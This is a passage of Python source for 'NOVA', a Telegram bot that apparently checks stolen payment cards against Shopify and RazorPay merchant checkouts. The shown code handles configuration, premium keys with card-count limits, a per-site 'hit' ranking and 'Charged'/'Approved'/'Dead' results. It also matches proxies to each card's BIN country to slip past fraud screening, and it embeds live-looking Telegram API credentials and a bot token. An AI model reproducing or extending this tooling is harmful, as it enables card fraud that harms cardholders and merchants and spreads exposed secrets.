# =============================================================================
# NOVA Bot — Single-File Source (v7.1.0)
# =============================================================================
# v7.1.0 vs v7.0.0:
#   - MERGED: checkout_engine (full Shopify graphql + curl_cffi TLS)
#   - MERGED: razorpay_engine (API-less RazorPay submit)
#   - MERGED: shopify_harvester (scan_file + harvest_from_seeds)
#   - MERGED: rz_harvester (scan_file + harvest_from_seeds)
#   - ZERO external module deps beyond: telethon, aiohttp, aiofiles,
#     httpx, curl_cffi, psutil
#   - Data files required: keywords.txt, seeds.txt (optional; defaults
#     built into _DEFAULT_KEYWORDS / _DEFAULT_SEEDS below)
# =============================================================================

import os
import re
import io
import json
import time
import random
import string
import hashlib
import logging
import asyncio
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timedelta
from enum import Enum
from urllib.parse import urlparse, quote, urlencode
from typing import Any, Dict, List, Optional, Tuple

import httpx
import aiohttp
import aiofiles
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError, UserNotParticipantError
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    from curl_cffi.requests import Session as CurlSession
    from curl_cffi.requests.errors import RequestsError as CurlRequestsError
    CURL_CFFI_OK = True
except ImportError:
    CurlSession = None
    CurlRequestsError = Exception
    CURL_CFFI_OK = False


# =============================================================================
# SECTION 1 — LOGGING
# =============================================================================
log = logging.getLogger("NOVA")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s',
                          datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_fmt)
log.addHandler(_ch)

if not os.getenv("RAILWAY_ENVIRONMENT"):
    try:
        _fh = logging.FileHandler('nova_bot.log', encoding='utf-8')
        _fh.setLevel(logging.INFO)
        _fh.setFormatter(_fmt)
        log.addHandler(_fh)
    except Exception:
        pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")


def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# =============================================================================
# SECTION 2 — BOLD SANS TEXT
# =============================================================================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper): _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower): _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits): _BOLD_SANS_MAP[_c] = _bold_digits[_i]


def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))


# =============================================================================
# SECTION 3 — CONFIG
# =============================================================================
API_ID    = int(os.getenv("API_ID") or 33657928)
API_HASH  = os.getenv("API_HASH", "a61fde61442113b9a65c699f7020d59a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8881611682:AAGUaw5qi17Qy3cLGtJwIe6qXoK17WcW_lU")
ADMIN_ID  = [8871910561]

ADMIN_ID_FILE = "admins.json"


def _load_admins():
    global ADMIN_ID
    try:
        if os.path.exists(ADMIN_ID_FILE):
            with open(ADMIN_ID_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                merged = list(dict.fromkeys(
                    list(ADMIN_ID) + [int(x) for x in data if str(x).lstrip('-').isdigit()]
                ))
                ADMIN_ID.clear()
                ADMIN_ID.extend(merged)
    except Exception as e:
        log_system("ADMIN", f"load failed: {e}", "warning")


def _save_admins():
    try:
        with open(ADMIN_ID_FILE, "w", encoding="utf-8") as f:
            json.dump(list(ADMIN_ID), f, indent=2)
    except Exception as e:
        log_system("ADMIN", f"save failed: {e}", "warning")


HIT_CHANNEL_ID          = -1004381920430
CHARGED_ONLY_CHANNEL_ID = -1003965573664
GROUP_CHAT_ID           = -1003902938287
REDEEM_LOG_CHANNEL_ID   = -1003902938287

FORCE_JOIN_GROUP_ID   = -1003902938287
FORCE_JOIN_CHANNEL_ID = -1004381920430

GROUP_INVITE_LINK   = "https://t.me/+_0kBIVQujUEyOTc1"
CHANNEL_INVITE_LINK = "https://t.me/+3dlEoWK-vGcwMDI9"

BOT_BRAND    = "NOVA"
BOT_USERNAME = "@spectrumxchkbot"
OWNER_NAME   = "SUPERGREMLIN"
OWNER_TAG    = "@SUPERGREMLIN01"
DEV_LINE     = f"⌬ {bs('Bot By')} <a href='https://t.me/{OWNER_TAG.lstrip('@')}'>{OWNER_TAG}</a>"
SEP          = "━━━━━━━━━━━━━━━━━"
PE           = "💎"

FREE_DAILY_LIMIT     = 15
FREE_COOLDOWN_SEC    = 10
MAX_PROXIES_PER_USER = 100
DEFAULT_KEY_HOURS    = 24
DEFAULT_KEY_CC_LIMIT = 1500

MIN_PRODUCT_PRICE = 0.01
MAX_PRODUCT_PRICE = 7.00

MASS_HARD_CAP_ADMIN   = 10000
MASS_HARD_CAP_PREMIUM = 5000

PREMIUM_USERS_FILE = "premium_users.json"
USER_PROXIES_FILE  = "user_proxies.json"
KEYS_FILE          = "keys.json"
SITES_FILE         = "sites.txt"
RZ_SITES_FILE      = "rz_sites.txt"
RANK_FILE          = "rank.json"
SETTINGS_FILE      = "settings.json"
PREMIUM_DAILY_FILE = "premium_daily.json"
USER_LIMITS_FILE   = "user_daily_limits.json"
REFERRALS_FILE     = "referrals.json"
STREAKS_FILE       = "streaks.json"
SITE_STATS_FILE    = "site_stats.json"
RZ_LAST_SCAN_FILE      = "rz_sites_last_scan.json"
SHOPIFY_LAST_SCAN_FILE = "shopify_last_scan.json"
WELCOME_FILE_ID_FILE   = os.environ.get("WELCOME_FILE_ID_FILE", ".welcome_file_id.txt")

REFERRAL_MILESTONE_EVERY    = 5
REFERRAL_MILESTONE_HOURS    = 24
REFERRAL_MILESTONE_CC_LIMIT = 5000
REFERRAL_MIN_CHECKS         = 1
REFERRAL_MAX_PER_USER       = 500

STREAK_MIN_GAP_HOURS = 20
STREAK_MAX_GAP_HOURS = 30
STREAK_MILESTONES = {3: 6, 7: 24, 14: 72, 30: 240}

SITE_DISABLE_AFTER_ERRORS   = 10
SITE_MIN_ATTEMPTS_TO_JUDGE  = 20
SITE_TOP_PERCENT            = 0.7

SP_PER_USER_WORKERS      = 70
MSP_PER_USER_WORKERS     = 70
RZ_PER_USER_WORKERS      = 20
MRZ_PER_USER_WORKERS     = 20
SITE_PER_USER_WORKERS    = 70
PROXY_PER_USER_WORKERS   = 70
HARVEST_PER_USER_WORKERS = 70

SHOPIFY_SINGLE_TIMEOUT  = 90.0
SHOPIFY_MASS_TIMEOUT    = 90.0
RAZORPAY_SINGLE_TIMEOUT = 120.0
RAZORPAY_MASS_TIMEOUT   = 120.0


# =============================================================================
# SECTION 4 — PREMIUM EMOJI
# =============================================================================
PREMIUM_EMOJI_IDS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","⚠️":"5420323339723881652",
    "⚡":"6174996123522959140","🔥":"5039644681583985437","💎":"5427168083074628963",
    "✔️":"5206607081334906820","✨":"5040016479722931047","🎉":"5039778134807806727",
    "🎯":"5039905162760553480","⛔":"6181277564732972292","🛑":"6181277564732972292",
    "🚨":"5039671744172917707","💰":"5039789890133296083","💳":"5447453226498552490",
    "💲":"5447579253723918909","💵":"5409048419211682843","💸":"5837027045376271166",
    "🏦":"6089185885289454318","🏧":"5447453226498552490","📊":"5042290883949495533",
    "📈":"5039808285478224750","📉":"5039759318556083411","🥇":"6179279816529814743",
    "🥈":"5042036407137207122","🥉":"5039808285478224750","🥔":"5039928501612839813",
    "🧨":"5039778134807806727","🏆":"6089185885289454318","👑":"5039727497143387500",
    "👤":"5992129361090711368","🤖":"6174896506051495705","⚙️":"5445059250382469069",
    "🌐":"6321225560789877992","ℹ️":"5334544901428229844","🏳️":"5256143829672672750",
    "📍":"5391032818111363540","📡":"5447448489149625830","🔔":"5042111805288089118",
    "🛡":"5042328396193864923","🛡️":"5042328396193864923","🔑":"5399885604701880145",
    "🔒":"5445059250382469069","🔓":"5445373981290952548","🔗":"5042101437237036298",
    "🔐":"5445059250382469069","⏰":"5445350406215465190","⏱️":"5445350406215465190",
    "⏱":"5445350406215465190","⌛":"5445350406215465190","🚀":"6174445826543191998",
    "⭐":"5042061201983407048","💫":"5042200814190330758","🔮":"5042302287087666158",
    "💠":"5427168083074628963","🌍":"5447410659077661506","🔰":"5042328396193864923",
    "📧":"5443127283898405358","💀":"5042209657527993345","💯":"5042297717242463211",
    "🚫":"5039671744172917707","😈":"6336664426325740768","📝":"5444889156792646660",
    "📁":"6026239398650056451","🗑":"5039614900280754969","📅":"6168242008277125889",
    "📤":"5445355530111437729","📥":"5443127283898405358","🟢":"5039928501612839813",
    "🔴":"5042042652019655612","🟡":"5042036407137207122","🔵":"5042290883949495533",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⏸":"5042036407137207122","▶️":"5039753786638205957","⏹":"5134537521518085000",
    "🧹":"5039751080808809534","📌":"5397782960512444700","📋":"5445260044398524944",
    "🔧":"5445059250382469069","🔍":"5042302287087666158","💻":"5039579582764680065",
    "📩":"5443127283898405358","💬":"5040036030414062506","📢":"5447644880824181073",
    "📣":"5447644880824181073","💡":"5042264341051605743","🛒":"5445224894386172410",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏠":"5416041192905265756",
    "🏙️":"5447410659077661506","📞":"5443127283898405358","📮":"5444889156792646660",
    "🗺️":"6321225560789877992","↪️":"5445365692004071819","🔙":"5445365692004071819",
    "⬅️":"5445365692004071819","➡️":"5445365692004071819","🎀":"5039953030171067177",
    "🎊":"5039778134807806727","🌟":"5042061201983407048","🔀":"5348386034835015762",
    "🎬":"5445355530111437729","🧠":"6174896506051495705","🖥️":"5039579582764680065",
    "💾":"6026239398650056451","💿":"6026239398650056451","🏓":"5042200814190330758",
    "🎁":"5039778134807806727","🎈":"5039778134807806727","🎨":"5039953030171067177",
    "🌸":"5039953030171067177","🍀":"5039928501612839813","🌙":"5042200814190330758",
    "☀️":"5039808285478224750","🌈":"5256143829672672750","👥":"5443038326535759644",
}


def pe(text):
    if not text:
        return text
    out = text
    for emoji in sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True):
        doc_id = PREMIUM_EMOJI_IDS[emoji]
        out = out.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return out


# =============================================================================
# SECTION 5 — MESSAGE HELPERS
# =============================================================================
client_instance = None


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons,
                        file=file, link_preview=False), timeout=15)
    except asyncio.TimeoutError:
        return None
    except Exception:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except Exception:
            return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities,
                                         buttons=buttons, file=file, link_preview=False),
            timeout=15)
    except Exception:
        return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities,
                                        buttons=buttons, link_preview=False), timeout=8)
    except Exception:
        pass


async def send_entities(chat_id, html_text, buttons=None, file=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        return await client_instance.send_message(
            chat_id, text, formatting_entities=ents,
            buttons=buttons, link_preview=False, **kwargs)
    except Exception as e:
        log_system("SEND", f"send_entities failed: {e}", "error")
        return None


async def send_file_entities(chat_id, file, html_caption, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_caption)
        return await client_instance.send_file(
            chat_id, file, caption=text, formatting_entities=ents,
            buttons=buttons, **kwargs)
    except Exception as e:
        log_system("SEND_FILE", f"send_file_entities failed: {e}", "error")
        return None


async def edit_entities(msg, html_text, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        await msg.edit(text, formatting_entities=ents,
                       buttons=buttons, link_preview=False, **kwargs)
        return True
    except Exception:
        return False


# =============================================================================
# SECTION 6 — BUTTON HELPER
# =============================================================================
BUTTON_ICONS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","↪️":"5445365692004071819",
    "🔥":"5039644681583985437","⚡":"6174996123522959140","⭐":"5042061201983407048",
    "🚀":"6174445826543191998","⚙️":"5445059250382469069","📡":"5447448489149625830",
    "💫":"5042200814190330758","💎":"5427168083074628963","🌐":"6321225560789877992",
    "⚠️":"5420323339723881652","🛡️":"5042328396193864923","💰":"5039789890133296083",
    "👑":"5039727497143387500","🤖":"6174896506051495705","📋":"5445260044398524944",
    "💳":"5447453226498552490","⏰":"5445350406215465190","💻":"5039579582764680065",
    "🔑":"5399885604701880145","🔓":"5445373981290952548","🔌":"6321225560789877992",
    "🛠️":"5445059250382469069","🔙":"5445365692004071819","🛒":"5445224894386172410",
    "🔴":"5042042652019655612","📁":"6026239398650056451","📥":"5443127283898405358",
    "📢":"5447644880824181073","👥":"5443038326535759644","📩":"5443127283898405358",
    "💬":"5040036030414062506","🥇":"6179279816529814743","🥈":"5042036407137207122",
    "🥉":"5039808285478224750","🥔":"5039928501612839813","🧨":"5039778134807806727",
    "🟢":"5039928501612839813","🔵":"5042290883949495533","🟡":"5042036407137207122",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⛔":"6181277564732972292","🛑":"6181277564732972292","🚨":"5039671744172917707",
    "🎯":"5039905162760553480","📊":"5042290883949495533","📈":"5039808285478224750",
    "🏆":"6089185885289454318","👤":"5992129361090711368","📌":"5397782960512444700",
    "🔍":"5042302287087666158","🔧":"5445059250382469069","💡":"5042264341051605743",
    "📝":"5444889156792646660","🗑":"5039614900280754969","📅":"6168242008277125889",
    "🧹":"5039751080808809534","🎉":"5039778134807806727","✨":"5040016479722931047",
    "✔️":"5206607081334906820","🔒":"5445059250382469069","🔐":"5445059250382469069",
    "🌍":"5447410659077661506","📍":"5391032818111363540","🎬":"5445355530111437729",
    "🎀":"5039953030171067177","🎊":"5039778134807806727","🌟":"5042061201983407048",
    "💯":"5042297717242463211","😈":"6336664426325740768","💀":"5042209657527993345",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏦":"6089185885289454318",
    "💵":"5409048419211682843","💸":"5837027045376271166","💲":"5447579253723918909",
    "⏱️":"5445350406215465190","⏱":"5445350406215465190","⌛":"5445350406215465190",
    "📤":"5445355530111437729","🔗":"5042101437237036298","💠":"5427168083074628963",
    "🔮":"5042302287087666158","🔀":"5348386034835015762",
}


def pbtn(text, data=None, url=None, style=None, icon=None):
    icon_id = None
    if icon:
        icon_id = BUTTON_ICONS.get(icon)
        if icon_id:
            icon_id = int(icon_id)
    if icon_id is None and text:
        for e, i in BUTTON_ICONS.items():
            if e in text:
                icon_id = int(i)
                break
    clean = text
    if icon and icon in clean:
        clean = clean.replace(icon, '').strip()
    if url:
        try:
            return Button.url(clean, url, style=style)
        except Exception:
            return Button.url(clean, url)
    if data:
        try:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data,
                                 icon=icon_id, style=style)
        except Exception:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data)
    try:
        return Button.inline(clean, b"none", icon=icon_id, style=style)
    except Exception:
        return Button.inline(clean, b"none")


# =============================================================================
# SECTION 7 — JSON STORAGE
# =============================================================================
def _read_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return default


def _write_json(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        log_system("FS", f"write {path} failed: {e}", "error")


# =============================================================================
# SECTION 8 — PREMIUM USERS
# =============================================================================
def load_premium_users() -> dict:
    data = _read_json(PREMIUM_USERS_FILE, None)
    if data is None:
        data = {str(uid): None for uid in ADMIN_ID}
        _write_json(PREMIUM_USERS_FILE, data)
    return data


def save_premium_users(data: dict):
    _write_json(PREMIUM_USERS_FILE, data)


def is_premium(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    data = load_premium_users()
    uid = str(user_id)
    if uid not in data:
        return False
    expiry = data[uid]
    if expiry is None:
        return True
    info = expiry
    if isinstance(info, dict):
        exp = info.get("expiry")
        if exp is None:
            return True
        if datetime.now().timestamp() > float(exp):
            del data[uid]
            save_premium_users(data)
            return False
        return True
    if datetime.now().timestamp() > float(info):
        del data[uid]
        save_premium_users(data)
        return False
    return True


def add_premium(user_id: int, expiry_ts=None, cc_limit=None):
    data = load_premium_users()
    if expiry_ts is None and cc_limit is None:
        data[str(user_id)] = None
    else:
        data[str(user_id)] = {"expiry": expiry_ts, "cc_limit": cc_limit or 100000,
                              "activated_at": datetime.now().isoformat()}
    save_premium_users(data)


def remove_premium(user_id: int) -> bool:
    data = load_premium_users()
    uid = str(user_id)
    if uid in data:
        del data[uid]
        save_premium_users(data)
        return True
    return False


def get_cc_limit(user_id: int) -> int:
    if user_id in ADMIN_ID:
        return 100000
    data = load_premium_users()
    uid = str(user_id)
    if uid not in data:
        return 0
    info = data[uid]
    if info is None:
        return 100000
    if isinstance(info, dict):
        exp = info.get("expiry")
        if exp and datetime.now().timestamp() > float(exp):
            return 0
        return int(info.get("cc_limit", DEFAULT_KEY_CC_LIMIT))
    return 100000


# =============================================================================
# SECTION 9 — PROXIES
# =============================================================================
def load_user_proxies(user_id: int) -> list:
    data = _read_json(USER_PROXIES_FILE, {})
    return data.get(str(user_id), [])


def save_user_proxies(user_id: int, proxies: list):
    data = _read_json(USER_PROXIES_FILE, {})
    data[str(user_id)] = proxies
    _write_json(USER_PROXIES_FILE, data)


# =============================================================================
# SECTION 10 — SHOPIFY SITES FILE
# =============================================================================
def load_sites() -> list:
    if not os.path.exists(SITES_FILE):
        return []
    try:
        with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def save_sites(sites: list):
    try:
        with open(SITES_FILE, 'w', encoding='utf-8') as f:
            for s in sites:
                f.write(s + "\n")
    except Exception as e:
        log_system("FS", f"save sites failed: {e}", "error")


# =============================================================================
# SECTION 11 — RAZORPAY SITES FILE
# =============================================================================
def load_rz_sites() -> list:
    if not os.path.exists(RZ_SITES_FILE):
        return []
    try:
        with open(RZ_SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def save_rz_sites(sites: list):
    try:
        with open(RZ_SITES_FILE, 'w', encoding='utf-8') as f:
            for s in sites:
                f.write(s + "\n")
    except Exception as e:
        log_system("FS", f"save rz sites failed: {e}", "error")


# =============================================================================
# SECTION 12 — WELCOME VIDEO FILE_ID
# =============================================================================
def get_welcome_file_id() -> Optional[str]:
    if os.path.exists(WELCOME_FILE_ID_FILE):
        try:
            with open(WELCOME_FILE_ID_FILE, "r", encoding="utf-8") as f:
                fid = f.read().strip()
                return fid or None
        except Exception:
            pass
    return None


def set_welcome_file_id(fid: str):
    try:
        with open(WELCOME_FILE_ID_FILE, "w", encoding="utf-8") as f:
            f.write(fid)
    except Exception:
        pass


# =============================================================================
# SECTION 13 — SITE STATS
# =============================================================================
_SITE_STATS_LOCK = threading.Lock()


def load_site_stats() -> dict:
    return _read_json(SITE_STATS_FILE, {})


def save_site_stats(d: dict):
    _write_json(SITE_STATS_FILE, d)


def _site_report(site: str, status: str):
    if not site:
        return
    try:
        with _SITE_STATS_LOCK:
            d = load_site_stats()
            s = d.get(site) or {
                "attempts": 0, "hits": 0, "declined": 0,
                "errors": 0, "last_used": 0, "disabled": False,
            }
            s["attempts"] = int(s.get("attempts", 0)) + 1
            s["last_used"] = time.time()
            if status in ("Charged", "Approved", "3DS"):
                s["hits"] = int(s.get("hits", 0)) + 1
                s["errors"] = 0
            elif status == "Dead":
                s["declined"] = int(s.get("declined", 0)) + 1
            else:
                s["errors"] = int(s.get("errors", 0)) + 1
            if s["attempts"] >= SITE_MIN_ATTEMPTS_TO_JUDGE:
                if s["hits"] == 0 and s["errors"] >= SITE_DISABLE_AFTER_ERRORS:
                    s["disabled"] = True
            d[site] = s
            save_site_stats(d)
    except Exception as e:
        log_system("SITE_STATS", f"report {site}: {e}", "error")


def _site_score(site: str) -> float:
    d = load_site_stats()
    s = d.get(site)
    if not s:
        return 1.0
    if s.get("disabled"):
        return -1.0
    attempts = max(1, int(s.get("attempts", 1)))
    hits = int(s.get("hits", 0))
    errors = int(s.get("errors", 0))
    rate = hits / attempts
    penalty = min(0.5, errors * 0.05)
    return rate - penalty


def _get_active_sites(all_sites: list) -> list:
    if not all_sites:
        return []
    d = load_site_stats()
    scored = []
    for s in all_sites:
        info = d.get(s) or {}
        if info.get("disabled"):
            continue
        scored.append((s, _site_score(s)))
    if not scored:
        for s in all_sites:
            if s in d:
                d[s]["disabled"] = False
                d[s]["errors"] = 0
        save_site_stats(d)
        return all_sites
    scored.sort(key=lambda x: x[1], reverse=True)
    top_n = max(1, int(len(scored) * SITE_TOP_PERCENT))
    top = [s for s, _ in scored[:top_n]]
    bottom = [s for s, _ in scored[top_n:]]
    random.shuffle(top)
    random.shuffle(bottom)
    return top + bottom


# =============================================================================
# SECTION 14 — SMART PROXY ROTATION
# =============================================================================
_BIN_COUNTRY_CACHE = {}

_COUNTRY_CODES = {
    'US','CA','MX','BR','AR','CL','CO','PE','VE','EC','UY','PY','BO',
    'GB','IE','DE','FR','IT','ES','PT','NL','BE','CH','AT','SE','NO',
    'DK','FI','PL','CZ','HU','RO','GR','RU','UA','TR',
    'AE','SA','QA','KW','BH','OM','JO','LB','IL','EG','MA','DZ','TN',
    'ZA','NG','KE',
    'IN','PK','BD','LK','NP','CN','HK','TW','JP','KR','TH','VN','PH',
    'MY','SG','ID',
    'AU','NZ','FJ',
}

_PROXY_COUNTRY_NEIGHBOURS = {
    'US': ['CA', 'MX'], 'CA': ['US'],
    'GB': ['IE', 'FR', 'DE', 'NL'], 'IE': ['GB'],
    'DE': ['AT', 'CH', 'NL', 'FR', 'PL', 'CZ'], 'AT': ['DE', 'CH'],
    'CH': ['DE', 'FR', 'IT', 'AT'], 'FR': ['BE', 'DE', 'IT', 'ES', 'CH'],
    'IT': ['FR', 'DE', 'CH', 'AT'], 'ES': ['FR', 'PT', 'IT'], 'PT': ['ES'],
    'NL': ['BE', 'DE', 'GB'], 'BE': ['NL', 'FR', 'DE'],
    'AU': ['NZ'], 'NZ': ['AU'],
    'IN': ['PK', 'LK', 'BD'], 'AE': ['SA', 'QA', 'KW', 'BH', 'OM'],
    'SA': ['AE', 'QA', 'KW', 'BH', 'OM'], 'BR': ['AR', 'CL', 'CO'],
    'MX': ['US'], 'RU': ['UA'], 'UA': ['RU'], 'CN': ['HK', 'TW'],
    'HK': ['CN', 'TW'], 'JP': ['KR'], 'KR': ['JP'],
    'TH': ['VN', 'MY', 'SG'], 'VN': ['TH', 'MY', 'SG'],
    'MY': ['SG', 'TH', 'ID'], 'SG': ['MY', 'ID'], 'ID': ['MY', 'SG'],
}


async def _get_bin_country(bin_prefix: str) -> str:
    bin6 = (bin_prefix or '')[:6]
    if not bin6 or len(bin6) < 6 or not bin6.isdigit():
        return ""
    if bin6 in _BIN_COUNTRY_CACHE:
        return _BIN_COUNTRY_CACHE[bin6]
    try:
        session = await get_bin_session()
        async with session.get(
            f"https://lookup.binlist.net/{bin6}",
            headers={'Accept-Version': '3'},
            timeout=aiohttp.ClientTimeout(total=8),
        ) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                cc = ((data.get('country') or {}).get('alpha2') or "").upper()
                _BIN_COUNTRY_CACHE[bin6] = cc
                return cc
    except Exception:
        pass
    _BIN_COUNTRY_CACHE[bin6] = ""
    return ""


def _parse_proxy_country(proxy_line: str) -> str:
    if not proxy_line:
        return ""
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(1)
    m = re.search(r'[|#]([A-Z]{2})$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(1)
    return ""


def _strip_country_from_proxy(proxy_line: str) -> str:
    if not proxy_line:
        return proxy_line
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(2)
    m = re.search(r'^(.+?)[|#]([A-Z]{2})$', p)
    if m and m.group(2) in _COUNTRY_CODES:
        return m.group(1)
    return p


async def _pick_smart_proxy(card: str, proxies: list) -> Optional[str]:
    if not proxies:
        return None
    bin_country = await _get_bin_country(card.split('|')[0][:6])
    if not bin_country:
        return None
    tagged = {}
    for pr in proxies:
        cc = _parse_proxy_country(pr)
        if cc:
            tagged.setdefault(cc, []).append(pr)
    if not tagged:
        return None
    if bin_country in tagged:
        return random.choice(tagged[bin_country])
    for nb in _PROXY_COUNTRY_NEIGHBOURS.get(bin_country, []):
        if nb in tagged:
            return random.choice(tagged[nb])
    return None


# =============================================================================
# SECTION 15 — KEYS
# =============================================================================
def load_keys() -> dict:
    return _read_json(KEYS_FILE, {})


def save_keys(keys: dict):
    _write_json(KEYS_FILE, keys)


def generate_key() -> str:
    part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
    return f"NOVA_{part}"


# =============================================================================
# SECTION 16 — RANK
# =============================================================================
def load_rank() -> dict:
    return _read_json(RANK_FILE, {})


def save_rank(data: dict):
    _write_json(RANK_FILE, data)


def increment_charge_count(user_id: int):
    data = load_rank()
    uid = str(user_id)
    data[uid] = data.get(uid, 0) + 1
    save_rank(data)


def count_successful_checks(user_id: int) -> int:
    rank = load_rank()
    try:
        return int(rank.get(str(user_id), 0))
    except Exception:
        return 0


# =============================================================================
# SECTION 17 — SETTINGS
# =============================================================================
def load_settings() -> dict:
    return _read_json(SETTINGS_FILE, {
        "maintenance": False,
        "threshold": 7.00,
        "min_price": 0.01,
    })


def save_settings(data: dict):
    _write_json(SETTINGS_FILE, data)


_MAINT_CACHE = {"v": False, "ts": 0.0}


def get_maintenance() -> bool:
    now = time.time()
    if now - _MAINT_CACHE["ts"] < 30:
        return _MAINT_CACHE["v"]
    v = bool(load_settings().get("maintenance", False))
    _MAINT_CACHE["v"] = v
    _MAINT_CACHE["ts"] = now
    return v


def set_maintenance(enabled: bool):
    s = load_settings()
    s["maintenance"] = bool(enabled)
    save_settings(s)
    _MAINT_CACHE["v"] = bool(enabled)
    _MAINT_CACHE["ts"] = time.time()


def get_threshold() -> float:
    return float(load_settings().get("threshold", 7.00))


def set_threshold(val: float):
    s = load_settings()
    s["threshold"] = float(val)
    save_settings(s)


def get_min_price() -> float:
    return float(load_settings().get("min_price", 0.01))


def set_min_price(val: float):
    s = load_settings()
    s["min_price"] = float(val)
    save_settings(s)


# =============================================================================
# SECTION 18 — FORCE-JOIN
# =============================================================================
FORCE_JOIN_CHATS = [
    (FORCE_JOIN_GROUP_ID,   "Group",   GROUP_INVITE_LINK),
    (FORCE_JOIN_CHANNEL_ID, "Channel", CHANNEL_INVITE_LINK),
]

_JOIN_CACHE = {}
_JOIN_CACHE_TTL = 600


async def _is_in_chat(user_id: int, chat_id: int):
    from telethon.tl.functions.channels import GetParticipantRequest
    from telethon.errors import (
        UserNotParticipantError, ChannelPrivateError,
        ChatAdminRequiredError, UserIdInvalidError,
    )
    if not chat_id:
        return None
    try:
        await client_instance(GetParticipantRequest(channel=chat_id, participant=user_id))
        return True
    except UserNotParticipantError:
        return False
    except (ChannelPrivateError, ChatAdminRequiredError):
        log_system("FORCE_JOIN", f"bot cannot verify chat {chat_id}", "warning")
        return None
    except UserIdInvalidError:
        return False
    except Exception as e:
        log_system("FORCE_JOIN", f"unexpected error chat {chat_id}: {e!r}", "warning")
        return None


async def is_user_joined(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached_at = _JOIN_CACHE.get(user_id)
    if cached_at and now - cached_at < _JOIN_CACHE_TTL:
        return True
    results = await asyncio.gather(
        _is_in_chat(user_id, FORCE_JOIN_CHATS[0][0]),
        _is_in_chat(user_id, FORCE_JOIN_CHATS[1][0]),
        return_exceptions=True,
    )
    for r in results:
        if r is False:
            return False
    _JOIN_CACHE[user_id] = now
    return True


async def send_join_required_message(event):
    rows = []
